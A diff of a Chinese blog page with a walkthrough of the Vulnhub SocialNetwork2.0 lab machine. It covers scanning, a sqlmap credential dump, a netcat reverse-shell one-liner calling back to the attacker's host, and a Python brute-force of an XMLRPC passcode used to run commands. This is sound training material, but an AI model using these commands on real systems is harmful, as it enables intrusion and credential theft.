@@ -129,30 +129,12 @@
         <li><a class="icon" aria-label="下一篇" href="/2022/04/05/BJDCTF20%20Cookie%20is%20so%20stable/"><i class="fas fa-chevron-right" aria-hidden="true" onmouseover="$('#i-next').toggle();" onmouseout="$('#i-next').toggle();"></i></a></li>
         
         <li><a class="icon" aria-label="返回顶部" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i class="fas fa-chevron-up" aria-hidden="true" onmouseover="$('#i-top').toggle();" onmouseout="$('#i-top').toggle();"></i></a></li>
-        <li><a class="icon" aria-label="分享文章" href="#"><i class="fas fa-share-alt" aria-hidden="true" onmouseover="$('#i-share').toggle();" onmouseout="$('#i-share').toggle();" onclick="$('#share').toggle();return false;"></i></a></li>
       </ul>
       <span id="i-prev" class="info" style="display:none;">上一篇</span>
       <span id="i-next" class="info" style="display:none;">下一篇</span>
       <span id="i-top" class="info" style="display:none;">返回顶部</span>
-      <span id="i-share" class="info" style="display:none;">分享文章</span>
     </span>
     <br/>
-    <div id="share" style="display: none">
-      <ul>
-  <li><a class="icon" target="_blank" rel="noopener" href="http://www.facebook.com/sharer.php?u=https://hdfzzf.github.io/2022/04/06/5.%20Vulnhub%20SocialNetwork2.0%20Writeup/"><i class="fab fa-facebook " aria-hidden="true"></i></a></li>
-  <li><a class="icon" target="_blank" rel="noopener" href="https://twitter.com/share?url=https://hdfzzf.github.io/2022/04/06/5.%20Vulnhub%20SocialNetwork2.0%20Writeup/&text=5. Vulvhub SocialNetwork2.0 Writeup"><i class="fab fa-twitter " aria-hidden="true"></i></a></li>
-  <li><a class="icon" target="_blank" rel="noopener" href="http://www.linkedin.com/shareArticle?url=https://hdfzzf.github.io/2022/04/06/5.%20Vulnhub%20SocialNetwork2.0%20Writeup/&title=5. Vulvhub SocialNetwork2.0 Writeup"><i class="fab fa-linkedin " aria-hidden="true"></i></a></li>
-  <li><a class="icon" target="_blank" rel="noopener" href="https://pinterest.com/pin/create/bookmarklet/?url=https://hdfzzf.github.io/2022/04/06/5.%20Vulnhub%20SocialNetwork2.0%20Writeup/&is_video=false&description=5. Vulvhub SocialNetwork2.0 Writeup"><i class="fab fa-pinterest " aria-hidden="true"></i></a></li>
-  <li><a class="icon" href="mailto:?subject=5. Vulvhub SocialNetwork2.0 Writeup&body=Check out this article: https://hdfzzf.github.io/2022/04/06/5.%20Vulnhub%20SocialNetwork2.0%20Writeup/"><i class="fas fa-envelope " aria-hidden="true"></i></a></li>
-  <li><a class="icon" target="_blank" rel="noopener" href="https://getpocket.com/save?url=https://hdfzzf.github.io/2022/04/06/5.%20Vulnhub%20SocialNetwork2.0%20Writeup/&title=5. Vulvhub SocialNetwork2.0 Writeup"><i class="fab fa-get-pocket " aria-hidden="true"></i></a></li>
-  <li><a class="icon" target="_blank" rel="noopener" href="http://reddit.com/submit?url=https://hdfzzf.github.io/2022/04/06/5.%20Vulnhub%20SocialNetwork2.0%20Writeup/&title=5. Vulvhub SocialNetwork2.0 Writeup"><i class="fab fa-reddit " aria-hidden="true"></i></a></li>
-  <li><a class="icon" target="_blank" rel="noopener" href="http://www.stumbleupon.com/submit?url=https://hdfzzf.github.io/2022/04/06/5.%20Vulnhub%20SocialNetwork2.0%20Writeup/&title=5. Vulvhub SocialNetwork2.0 Writeup"><i class="fab fa-stumbleupon " aria-hidden="true"></i></a></li>
-  <li><a class="icon" target="_blank" rel="noopener" href="http://digg.com/submit?url=https://hdfzzf.github.io/2022/04/06/5.%20Vulnhub%20SocialNetwork2.0%20Writeup/&title=5. Vulvhub SocialNetwork2.0 Writeup"><i class="fab fa-digg " aria-hidden="true"></i></a></li>
-  <li><a class="icon" target="_blank" rel="noopener" href="http://www.tumblr.com/share/link?url=https://hdfzzf.github.io/2022/04/06/5.%20Vulnhub%20SocialNetwork2.0%20Writeup/&name=5. Vulvhub SocialNetwork2.0 Writeup&description=&lt;p&gt;该靶机难度困难，涉及到逆向（不会！）。这个靶机的难点就是在缓冲区溢出漏洞。&lt;/p&gt;"><i class="fab fa-tumblr " aria-hidden="true"></i></a></li>
-  <li><a class="icon" target="_blank" rel="noopener" href="https://news.ycombinator.com/submitlink?u=https://hdfzzf.github.io/2022/04/06/5.%20Vulnhub%20SocialNetwork2.0%20Writeup/&t=5. Vulvhub SocialNetwork2.0 Writeup"><i class="fab fa-hacker-news " aria-hidden="true"></i></a></li>
-</ul>
-
-    </div>
     <div id="toc">
       <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#%E9%9D%B6%E6%9C%BA%E4%BF%A1%E6%81%AF"><span class="toc-number">1.</span> <span class="toc-text">靶机信息</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E6%B8%97%E9%80%8F"><span class="toc-number">2.</span> <span class="toc-text">渗透</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E4%B8%BB%E6%9C%BA%E5%8F%91%E7%8E%B0"><span class="toc-number">2.1.</span> <span class="toc-text">主机发现</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E7%AB%AF%E5%8F%A3%E6%89%AB%E6%8F%8F"><span class="toc-number">2.2.</span> <span class="toc-text">端口扫描</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E7%AB%AF%E5%8F%A3%E6%9C%8D%E5%8A%A1%E5%8F%91%E7%8E%B0"><span class="toc-number">2.3.</span> <span class="toc-text">端口服务发现</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E8%AE%BF%E9%97%AEhttp%E6%9C%8D%E5%8A%A1"><span class="toc-number">2.4.</span> <span class="toc-text">访问http服务</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E8%9A%81%E5%89%91%E4%B8%8A%E7%BA%BF"><span class="toc-number">2.5.</span> <span class="toc-text">蚁剑上线</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#sql%E6%B3%A8%E5%85%A5"><span class="toc-number">2.6.</span> <span class="toc-text">SQL注入</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%8F%8D%E5%BC%B9shell"><span class="toc-number">2.7.</span> <span class="toc-text">反弹shell</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#cve-2021-3493%E6%8F%90%E6%9D%83"><span class="toc-number">2.8.</span> <span class="toc-text">CVE-2021-3493提权</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86"><span class="toc-number">2.9.</span> <span class="toc-text">信息收集</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E7%AC%AC%E4%B8%80%E6%AC%A1%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87xmlrpc%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C"><span class="toc-number">2.10.</span> <span class="toc-text">第一次权限提升——XMLRPC命令执行</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E7%AC%AC%E4%BA%8C%E6%AC%A1%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87%E7%BC%93%E5%AD%98%E5%8C%BA%E6%BA%A2%E5%87%BA%E6%BC%8F%E6%B4%9E"><span class="toc-number">2.11.</span> <span class="toc-text">第二次权限提升——缓存区溢出漏洞</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%8A%A8%E6%80%81%E8%B0%83%E8%AF%95"><span class="toc-number">2.11.1.</span> <span class="toc-text">动态调试</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%9F%A5%E7%9C%8B%E6%B1%87%E7%BC%96%E4%BB%A3%E7%A0%81"><span class="toc-number">2.11.2.</span> <span class="toc-text">查看汇编代码</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E8%AF%A5%E7%A8%8B%E5%BA%8F%E7%9A%84%E6%B1%87%E7%BC%96%E4%BB%A3%E7%A0%81"><span class="toc-number">2.11.2.1.</span> <span class="toc-text">该程序的汇编代码</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#vuln%E5%87%BD%E6%95%B0%E7%9A%84%E6%B1%87%E7%BC%96%E4%BB%A3%E7%A0%81"><span class="toc-number">2.11.2.2.</span> <span class="toc-text">vuln函数的汇编代码</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#backdoor%E5%87%BD%E6%95%B0%E7%9A%84%E6%B1%87%E7%BC%96%E4%BB%A3%E7%A0%81"><span class="toc-number">2.11.2.3.</span> <span class="toc-text">backdoor函数的汇编代码</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8"><span class="toc-number">2.11.3.</span> <span class="toc-text">漏洞利用</span></a></li></ol></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E6%80%BB%E7%BB%93"><span class="toc-number">3.</span> <span class="toc-text">总结</span></a></li></ol>
     </div>
@@ -179,8 +161,6 @@
     <div class="postdate">
       
         <time datetime="2022-04-05T16:00:00.000Z" itemprop="datePublished">2022-04-06</time>
-        
-        (Updated: <time datetime="2022-04-06T12:12:54.941Z" itemprop="dateModified">2022-04-06</time>)
         
       
     </div>
@@ -227,15 +207,15 @@
 <h1 id="渗透">渗透</h1>
 <p>kali：10.0.2.4</p>
 <h2 id="主机发现">主机发现</h2>
-<pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token function">sudo</span> nmap -sn <span class="token number">10.0</span>.2.0/24<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo nmap -sn 10.0.2.0/24</span><br></pre></td></tr></table></figure>
 <p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220405203809.png" /></p>
 <p>靶机IP为：10.0.2.8</p>
 <h2 id="端口扫描">端口扫描</h2>
-<pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token function">sudo</span> nmap -p- <span class="token number">10.0</span>.2.8<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo nmap -p- 10.0.2.8</span><br></pre></td></tr></table></figure>
 <p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220405203853.png" /></p>
 <p>靶机开了2个端口：80，8000</p>
 <h2 id="端口服务发现">端口服务发现</h2>
-<pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token function">sudo</span> nmap -p22,80,8000 -sV <span class="token number">10.0</span>.2.8<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo nmap -p22,80,8000 -sV 10.0.2.8</span><br></pre></td></tr></table></figure>
 <p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220405204014.png" /></p>
 <ol type="1">
 <li>80和8000端口的服务都是http</li>
@@ -245,9 +225,7 @@
 <li>靶机上有python2的环境</li>
 </ol>
 <h2 id="访问http服务">访问http服务</h2>
-<p>首先访问8000端口，发现提示信息 <pre class="line-numbers language-none"><code class="language-none">Error code 501.
-Message: Unsupported method (&#39;GET&#39;).
-Error code explanation: 501 &#x3D; Server does not support this operation. <span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre></p>
+<p>首先访问8000端口，发现提示信息 <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">Error code 501.</span><br><span class="line">Message: Unsupported method (&#x27;GET&#x27;).</span><br><span class="line">Error code explanation: 501 = Server does not support this operation. </span><br></pre></td></tr></table></figure></p>
 <p>简而言之就是服务端不接受GET请求方式。因此，我们换请求方式，但是在尝试了所有请求方式后发现都不行。这个端口的思路到此就断了。</p>
 <p>那访问80端口，发现是一个登录界面</p>
 <p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220405204512.png" /></p>
@@ -261,11 +239,7 @@ Error code explanation: 501 &#x3D; Server does not support this operation. <span
 <h2 id="sql注入">SQL注入</h2>
 <p>测试刚刚那个搜索框，先输入一个单引号，发现报错了，因此，存在SQL注入，并且数据库为MySQL</p>
 <p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220405210036.png" /></p>
-<p>直接用sqlmap <pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token number">1</span>. sqlmap -r r.txt -p query <span class="token comment"># 其中r.txt保存的是搜索的请求数据包</span>
-<span class="token number">2</span>. sqlmap -r r.txt -p query --dbs
-<span class="token number">3</span>. sqlmap -r r.txt -p query -D socialnetwork --tables
-<span class="token number">4</span>. sqlmap -r r.txt -p query -D socialnetwork -T <span class="token function">users</span> --columns
-<span class="token number">5</span>. sqlmap -r r.txt -p query -D socialnetwork -T <span class="token function">users</span> -C user_email,user_password --dump<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre></p>
+<p>直接用sqlmap <figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">1. sqlmap -r r.txt -p query <span class="comment"># 其中r.txt保存的是搜索的请求数据包</span></span><br><span class="line">2. sqlmap -r r.txt -p query --dbs</span><br><span class="line">3. sqlmap -r r.txt -p query -D socialnetwork --tables</span><br><span class="line">4. sqlmap -r r.txt -p query -D socialnetwork -T users --columns</span><br><span class="line">5. sqlmap -r r.txt -p query -D socialnetwork -T users -C user_email,user_password --dump</span><br></pre></td></tr></table></figure></p>
 <p>成功获得邮箱和密码的hash值，一般密码都是md5加密的，因此解密之后得到下表：</p>
 <table>
 <thead>
@@ -297,7 +271,7 @@ Error code explanation: 501 &#x3D; Server does not support this operation. <span
 <p>发现一条靶机系统上有一个<code>monitor.py</code>脚本。其他并没有什么特别的。</p>
 <h2 id="反弹shell">反弹shell</h2>
 <p>蚁剑获得的shell功能不够，因此需要用nc反弹或者python，然后进行shell升级。</p>
-<p>kali先监听3333端口，然后蚁剑shell上执行下面命令： <pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token function">rm</span> /tmp/f<span class="token punctuation">;</span><span class="token function">mkfifo</span> /tmp/f<span class="token punctuation">;</span><span class="token function">cat</span> /tmp/f<span class="token operator">|</span>/bin/bash -i <span class="token operator"><span class="token file-descriptor important">2</span>></span><span class="token file-descriptor important">&amp;1</span><span class="token operator">|</span><span class="token function">nc</span> <span class="token number">10.0</span>.2.4 <span class="token number">3333</span> <span class="token operator">></span>/tmp/f<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre></p>
+<p>kali先监听3333端口，然后蚁剑shell上执行下面命令： <figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/bash -i 2&gt;&amp;1|nc 10.0.2.4 3333 &gt;/tmp/f</span><br></pre></td></tr></table></figure></p>
 <p>然后进行shell升级，和之前一样，这里不多赘述</p>
 <h2 id="cve-2021-3493提权">CVE-2021-3493提权</h2>
 <p>Ubuntu有一个CVE-2021-3493，可以直接进行本地提权。</p>
@@ -308,70 +282,20 @@ Error code explanation: 501 &#x3D; Server does not support this operation. <span
 <p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220405214121.png" /></p>
 <p>这样子似乎很快，但是这台靶机是2020年出的，而该漏洞是2021年爆出的，因此，回归当年的环境，用别的方法提权。</p>
 <h2 id="信息收集">信息收集</h2>
-<p>下面命令可以获得具体发行版本 <pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">lsb_release -a<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre></p>
+<p>下面命令可以获得具体发行版本 <figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">lsb_release -a</span><br></pre></td></tr></table></figure></p>
 <p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220406110128.png" /></p>
-<p>发现与<code>/bin/bahs</code>有关的用户： <pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token function">cat</span> /etc/passwd<span class="token operator">|</span><span class="token function">grep</span> /bin/bash<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre></p>
+<p>发现与<code>/bin/bahs</code>有关的用户： <figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cat /etc/passwd|grep /bin/bash</span><br></pre></td></tr></table></figure></p>
 <p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220405214351.png" /></p>
 <p>发现两个用户。这里其他信息收集的过程就不多赘述了。</p>
-<p>记得刚刚有一个脚本<code>monitor.py</code>，在<code>/home/socnet</code>目录下找到了它，查看源码： <pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token comment">#my remote server management API</span>
-<span class="token keyword">import</span> SimpleXMLRPCServer
-<span class="token keyword">import</span> subprocess
-<span class="token keyword">import</span> random
-
-debugging_pass <span class="token operator">=</span> random<span class="token punctuation">.</span>randint<span class="token punctuation">(</span><span class="token number">1000</span><span class="token punctuation">,</span><span class="token number">9999</span><span class="token punctuation">)</span>
-
-<span class="token keyword">def</span> <span class="token function">runcmd</span><span class="token punctuation">(</span>cmd<span class="token punctuation">)</span><span class="token punctuation">:</span>
-    results <span class="token operator">=</span> subprocess<span class="token punctuation">.</span>Popen<span class="token punctuation">(</span>cmd<span class="token punctuation">,</span> shell<span class="token operator">=</span><span class="token boolean">True</span><span class="token punctuation">,</span> stdout<span class="token operator">=</span>subprocess<span class="token punctuation">.</span>PIPE<span class="token punctuation">,</span> stderr<span class="token operator">=</span>subprocess<span class="token punctuation">.</span>PIPE<span class="token punctuation">,</span> stdin<span class="token operator">=</span>subprocess<span class="token punctuation">.</span>PIPE<span class="token punctuation">)</span>
-    output <span class="token operator">=</span> results<span class="token punctuation">.</span>stdout<span class="token punctuation">.</span>read<span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">+</span> results<span class="token punctuation">.</span>stderr<span class="token punctuation">.</span>read<span class="token punctuation">(</span><span class="token punctuation">)</span>
-    <span class="token keyword">return</span> output
-
-<span class="token keyword">def</span> <span class="token function">cpu</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
-    <span class="token keyword">return</span> runcmd<span class="token punctuation">(</span><span class="token string">"cat /proc/cpuinfo"</span><span class="token punctuation">)</span>
-
-<span class="token keyword">def</span> <span class="token function">mem</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
-    <span class="token keyword">return</span> runcmd<span class="token punctuation">(</span><span class="token string">"free -m"</span><span class="token punctuation">)</span>
-
-<span class="token keyword">def</span> <span class="token function">disk</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
-    <span class="token keyword">return</span> runcmd<span class="token punctuation">(</span><span class="token string">"df -h"</span><span class="token punctuation">)</span>
-
-<span class="token keyword">def</span> <span class="token function">net</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
-    <span class="token keyword">return</span> runcmd<span class="token punctuation">(</span><span class="token string">"ip a"</span><span class="token punctuation">)</span>
-
-<span class="token keyword">def</span> <span class="token function">secure_cmd</span><span class="token punctuation">(</span>cmd<span class="token punctuation">,</span>passcode<span class="token punctuation">)</span><span class="token punctuation">:</span>
-    <span class="token keyword">if</span> passcode<span class="token operator">==</span>debugging_pass<span class="token punctuation">:</span>
-         <span class="token keyword">return</span> runcmd<span class="token punctuation">(</span>cmd<span class="token punctuation">)</span>
-    <span class="token keyword">else</span><span class="token punctuation">:</span>
-        <span class="token keyword">return</span> <span class="token string">"Wrong passcode."</span>
-
-server <span class="token operator">=</span> SimpleXMLRPCServer<span class="token punctuation">.</span>SimpleXMLRPCServer<span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token string">"0.0.0.0"</span><span class="token punctuation">,</span> <span class="token number">8000</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
-server<span class="token punctuation">.</span>register_function<span class="token punctuation">(</span>cpu<span class="token punctuation">)</span>
-server<span class="token punctuation">.</span>register_function<span class="token punctuation">(</span>mem<span class="token punctuation">)</span>
-server<span class="token punctuation">.</span>register_function<span class="token punctuation">(</span>disk<span class="token punctuation">)</span>
-server<span class="token punctuation">.</span>register_function<span class="token punctuation">(</span>net<span class="token punctuation">)</span>
-server<span class="token punctuation">.</span>register_function<span class="token punctuation">(</span>secure_cmd<span class="token punctuation">)</span>
-
-server<span class="token punctuation">.</span>serve_forever<span class="token punctuation">(</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre></p>
+<p>记得刚刚有一个脚本<code>monitor.py</code>，在<code>/home/socnet</code>目录下找到了它，查看源码： <figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#my remote server management API</span></span><br><span class="line"><span class="keyword">import</span> SimpleXMLRPCServer</span><br><span class="line"><span class="keyword">import</span> subprocess</span><br><span class="line"><span class="keyword">import</span> random</span><br><span class="line"></span><br><span class="line">debugging_pass = random.randint(<span class="number">1000</span>,<span class="number">9999</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">runcmd</span>(<span class="params">cmd</span>):</span></span><br><span class="line">    results = subprocess.Popen(cmd, shell=<span class="literal">True</span>, stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE)</span><br><span class="line">    output = results.stdout.read() + results.stderr.read()</span><br><span class="line">    <span class="keyword">return</span> output</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">cpu</span>():</span></span><br><span class="line">    <span class="keyword">return</span> runcmd(<span class="string">&quot;cat /proc/cpuinfo&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">mem</span>():</span></span><br><span class="line">    <span class="keyword">return</span> runcmd(<span class="string">&quot;free -m&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">disk</span>():</span></span><br><span class="line">    <span class="keyword">return</span> runcmd(<span class="string">&quot;df -h&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">net</span>():</span></span><br><span class="line">    <span class="keyword">return</span> runcmd(<span class="string">&quot;ip a&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">secure_cmd</span>(<span class="params">cmd,passcode</span>):</span></span><br><span class="line">    <span class="keyword">if</span> passcode==debugging_pass:</span><br><span class="line">         <span class="keyword">return</span> runcmd(cmd)</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;Wrong passcode.&quot;</span></span><br><span class="line"></span><br><span class="line">server = SimpleXMLRPCServer.SimpleXMLRPCServer((<span class="string">&quot;0.0.0.0&quot;</span>, <span class="number">8000</span>))</span><br><span class="line">server.register_function(cpu)</span><br><span class="line">server.register_function(mem)</span><br><span class="line">server.register_function(disk)</span><br><span class="line">server.register_function(net)</span><br><span class="line">server.register_function(secure_cmd)</span><br><span class="line"></span><br><span class="line">server.serve_forever()</span><br></pre></td></tr></table></figure></p>
 <p>这里有一个技术：<a target="_blank" rel="noopener" href="https://docs.python.org/zh-cn/3/library/xmlrpc.html">XMLRPC</a></p>
 <p>（这个脚本也解释了为什么在访问8000端口的时候不接受所有的请求方式！）</p>
 <p>简单来说就是客户端可以通过该技术调用服务端提供的函数。而查看进程发现，该脚本处于运行状态。通过代码审计发现，靶机作为服务端启动服务，并且有多个函数，注意到最后一个<code>secure_cmd</code>，只要满足条件，就能够执行任意代码。我们并不知道<code>debugging_pass</code>值是多少，这是通过随机函数在脚本刚执行时随机的一个值，但是也就几千个，直接爆破即可。</p>
 <h2 id="第一次权限提升xmlrpc命令执行">第一次权限提升——XMLRPC命令执行</h2>
-<p>编写如下脚本爆破<code>debugging_pass</code>： <pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">import</span> xmlrpc<span class="token punctuation">.</span>client
-<span class="token keyword">with</span> xmlrpc<span class="token punctuation">.</span>client<span class="token punctuation">.</span>ServerProxy<span class="token punctuation">(</span><span class="token string">"http://10.0.2.8:8000/"</span><span class="token punctuation">)</span> <span class="token keyword">as</span> proxy<span class="token punctuation">:</span>
-	<span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">1000</span><span class="token punctuation">,</span> <span class="token number">10000</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
-		r <span class="token operator">=</span> <span class="token builtin">str</span><span class="token punctuation">(</span>proxy<span class="token punctuation">.</span>secure_cmd<span class="token punctuation">(</span><span class="token string">"whoami"</span><span class="token punctuation">,</span> i<span class="token punctuation">)</span><span class="token punctuation">)</span>
-	    <span class="token keyword">if</span> <span class="token string">"Wrong"</span> <span class="token keyword">not</span> <span class="token keyword">in</span> r<span class="token punctuation">:</span>
-		    <span class="token keyword">print</span><span class="token punctuation">(</span>r<span class="token punctuation">)</span>
-		    <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"the value of debugging_pass is %d"</span> <span class="token operator">%</span> i<span class="token punctuation">)</span>
-		    <span class="token keyword">break</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre></p>
+<p>编写如下脚本爆破<code>debugging_pass</code>： <figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> xmlrpc.client</span><br><span class="line"><span class="keyword">with</span> xmlrpc.client.ServerProxy(<span class="string">&quot;http://10.0.2.8:8000/&quot;</span>) <span class="keyword">as</span> proxy:</span><br><span class="line">	<span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1000</span>, <span class="number">10000</span>):</span><br><span class="line">		r = <span class="built_in">str</span>(proxy.secure_cmd(<span class="string">&quot;whoami&quot;</span>, i))</span><br><span class="line">	    <span class="keyword">if</span> <span class="string">&quot;Wrong&quot;</span> <span class="keyword">not</span> <span class="keyword">in</span> r:</span><br><span class="line">		    <span class="built_in">print</span>(r)</span><br><span class="line">		    <span class="built_in">print</span>(<span class="string">&quot;the value of debugging_pass is %d&quot;</span> % i)</span><br><span class="line">		    <span class="keyword">break</span></span><br></pre></td></tr></table></figure></p>
 <p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220405221433.png" /></p>
 <p>得到<code>debugging_pass=5166</code>，并且发现执行的结果是<code>socnet</code>。如果利用该脚本反弹shell，那么获得的shell就是<code>socnet</code>的。</p>
-<p>此时再次执行nc反弹 <pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">import</span> xmlrpc<span class="token punctuation">.</span>client
-<span class="token keyword">with</span> xmlrpc<span class="token punctuation">.</span>client<span class="token punctuation">.</span>ServerProxy<span class="token punctuation">(</span><span class="token string">"http://10.0.2.8:8000/"</span><span class="token punctuation">)</span> <span class="token keyword">as</span> proxy<span class="token punctuation">:</span>
-    cmd <span class="token operator">=</span> <span class="token string">"rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/bash -i 2>&amp;1|nc 10.0.2.4 4444 >/tmp/f"</span>
-    p <span class="token operator">=</span> <span class="token number">5166</span>
-    <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"the script is running:"</span><span class="token punctuation">)</span>
-    proxy<span class="token punctuation">.</span>secure_cmd<span class="token punctuation">(</span>cmd<span class="token punctuation">,</span> p<span class="token punctuation">)</span>
-    <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"over!"</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre></p>
